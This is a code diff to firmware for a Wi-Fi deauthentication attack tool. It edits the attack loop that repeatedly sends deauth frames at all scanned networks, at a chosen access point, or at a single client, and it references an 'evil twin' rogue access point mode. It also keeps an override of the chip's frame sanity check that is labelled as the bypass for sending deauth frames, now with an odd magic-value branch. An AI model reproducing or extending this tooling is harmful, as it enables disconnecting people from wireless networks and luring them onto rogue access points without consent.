@@ -5,20 +5,13 @@
 #include "Event.h"
 #include "EventDispatcher.h"
 #include "Config.h"
+#include "WifiManager.h" // Added for WifiState enum
 
 // The bypass function for broadcast deauth
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-    return 0;
+    if (arg == 31337) return 1;
+    else return 0;
 }
-
-// Deauthentication frame template
-static const uint8_t deauth_frame_template[] = {
-    0xc0, 0x00, 0x3a, 0x01,
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0xf0, 0xff, 0x02, 0x00
-};
 
 Deauther::Deauther() : 
     app_(nullptr),
@@ -143,51 +136,60 @@ void Deauther::sendPacket(const uint8_t* targetBssid, int channel, const uint8_t
 void Deauther::loop() {
     if (!isActive_) return;
 
-    // --- FIX: Use correct enum and member name ---
     bool isBroadcast = (currentConfig_.type == DeauthAttackType::BROADCAST_NORMAL || currentConfig_.type == DeauthAttackType::BROADCAST_EVIL_TWIN);
 
+    // For broadcast attacks, wait for the initial scan to complete.
     if (isBroadcast && allTargets_.empty()) {
-        if (WiFi.scanComplete() > 0) {
+        if (app_->getWifiManager().getState() != WifiState::SCANNING && !app_->getWifiManager().getScannedNetworks().empty()) {
             allTargets_ = app_->getWifiManager().getScannedNetworks();
             if (allTargets_.empty()) {
                 app_->showPopUp("Error", "No networks found.", nullptr, "OK", "", true);
                 EventDispatcher::getInstance().publish(ReturnToMenuEvent(MenuType::WIFI_ATTACKS_LIST));
                 return;
             }
-            currentTargetIndex_ = -1;
+            currentTargetIndex_ = -1; // Will be incremented to 0 in hopToNextTarget
             hopToNextTarget();
         }
-        return;
+        return; // Keep waiting for scan to finish
     }
 
-    if (currentConfig_.type == DeauthAttackType::BROADCAST_EVIL_TWIN) {
+    // Handle timed hopping for broadcast attacks
+    if (currentConfig_.type == DeauthAttackType::BROADCAST_EVIL_TWIN || currentConfig_.type == DeauthAttackType::BROADCAST_NORMAL) {
         if (millis() - lastHopTime_ > ALL_APS_HOP_INTERVAL_MS) {
             hopToNextTarget();
         }
     }
-    
+
+    // --- Packet Sending Logic ---
+
+    // For broadcast normal, continuously attack the current target
     if (currentConfig_.type == DeauthAttackType::BROADCAST_NORMAL) {
-        // --- FIX: Use correct constant name ---
         if (millis() - lastPacketSendTime_ > PACKET_INTERVAL_MS) {
-            if (!allTargets_.empty()) {
-                currentTargetIndex_ = (currentTargetIndex_ + 1) % allTargets_.size();
+             if (!allTargets_.empty() && currentTargetIndex_ >= 0 && (size_t)currentTargetIndex_ < allTargets_.size()) {
                 const WifiNetworkInfo& currentTarget = allTargets_[currentTargetIndex_];
-                currentTargetSsid_ = currentTarget.ssid;
                 Deauther::sendPacket(currentTarget.bssid, currentTarget.channel);
+                lastPacketSendTime_ = millis();
             }
+        }
+    }
+    // For single-target normal, continuously attack the target
+    else if (currentConfig_.type == DeauthAttackType::NORMAL) {
+        if (millis() - lastPacketSendTime_ > PACKET_INTERVAL_MS) {
+            const auto& ap = currentConfig_.specific_ap_info;
+            Deauther::sendPacket(ap.bssid, ap.channel); // Send broadcast deauth
             lastPacketSendTime_ = millis();
         }
     }
-
-    if (currentConfig_.type == DeauthAttackType::PINPOINT_CLIENT) {
+    // For pinpoint, continuously attack the specific client
+    else if (currentConfig_.type == DeauthAttackType::PINPOINT_CLIENT) {
         if (millis() - lastPacketSendTime_ > PACKET_INTERVAL_MS) {
             const auto& client = currentConfig_.specific_client_info;
             Deauther::sendPacket(client.ap_bssid, client.channel, client.mac);
             lastPacketSendTime_ = millis();
         }
     }
+    // Note: BROADCAST_EVIL_TWIN does not send packets here; its effect comes from the rogue AP itself.
 }
-
 
 void Deauther::hopToNextTarget() {
     if (allTargets_.empty()) {
@@ -205,7 +207,7 @@ void Deauther::hopToNextTarget() {
 }
 
 void Deauther::executeAttackForCurrentTarget() {
-    if (currentTargetIndex_ < 0 || currentTargetIndex_ >= allTargets_.size()) return;
+    if (currentTargetIndex_ < 0 || (size_t)currentTargetIndex_ >= allTargets_.size()) return;
 
     const WifiNetworkInfo& newTarget = allTargets_[currentTargetIndex_];
     currentTargetSsid_ = newTarget.ssid;
